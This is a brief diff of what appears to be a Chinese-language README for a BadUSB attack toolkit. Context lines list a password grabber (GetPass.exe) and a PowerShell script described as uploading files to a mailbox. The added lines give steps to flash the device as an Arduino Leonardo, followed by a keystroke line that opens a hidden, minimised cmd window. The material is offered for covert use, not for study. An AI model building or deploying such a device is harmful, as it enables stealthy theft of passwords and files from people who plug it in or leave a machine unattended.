@@ -6,6 +6,11 @@ GetPass.exe
 
 PassUP.ps1
 上传文件到邮箱
+
+需要用到烧录工具Arduino  IDE
+
+打开Arduino选择“工具”--->"开发板"----->"Arduino Leonaedo"，选择badusb设备的"端口"
+
 ## 可使用最小化隐藏cmd窗口
 ```
   Keyboard.println("CMD /t:01 /k @ECHO OFF && MODE CON:cols=15 lines=1");   //使用最小化隐藏cmd窗口
